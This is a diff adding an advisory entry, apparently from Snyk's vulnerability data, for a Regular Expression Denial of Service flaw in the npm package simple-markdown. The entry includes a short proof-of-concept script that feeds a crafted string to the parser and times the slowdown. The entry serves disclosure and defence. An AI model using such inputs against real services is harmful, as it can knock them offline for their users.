@@ -181,3 +181,44 @@
   - https://github.com/Khan/simple-markdown/commit/89797fef9abb4cab2fb76a335968266a92588816
   - https://github.com/Khan/simple-markdown/issues/71#issuecomment-526762882
   source_url: https://snyk.io/vuln/SNYK-JS-SIMPLEMARKDOWN-460540
+- id: snykio:npm:simple-markdown:469242
+  title: Regular Expression Denial of Service (ReDoS)
+  description: |
+    [simple-markdown][1] is a markdown-like parser designed for simplicity
+    and extensibility.
+
+    Affected versions of this package are vulnerable to Regular Expression
+    Denial of Service (ReDoS). Parsing of complex quadratic documents with
+    may cause a slowdown of `7174ms` seconds due to parsing, and could
+    result in Denial of Service.
+
+    ### PoC   {#poc}
+
+        <script src="simple-markdown.min.js"></script>
+        <script>
+        var str = "<".repeat(2000)+":/".repeat(1500);
+        var t1 = performance.now();
+        SimpleMarkdown.defaultInlineParse(str);
+        var t2 = performance.now();
+        document.write(str.length+" bytes, "+(t2-t1)+"ms");
+        </script>
+
+
+
+    [1]: https://www.npmjs.com/package/simple-markdown
+  affected_package: simple-markdown
+  vulnerable_versions:
+  - "*"
+  severity: medium
+  package_manager: npm
+  cwe:
+  - CWE-185
+  disclosed_date: 2019-09-25
+  created_date: 2019-10-09
+  last_modified_date: 2019-10-09
+  credit:
+  - Alcaro
+  references:
+  - https://github.com/Khan/simple-markdown/commit/015a719bf5cdc561feea05500ecb3274ef609cd2
+  - https://github.com/Khan/simple-markdown/pull/73
+  source_url: https://snyk.io/vuln/SNYK-JS-SIMPLEMARKDOWN-469242
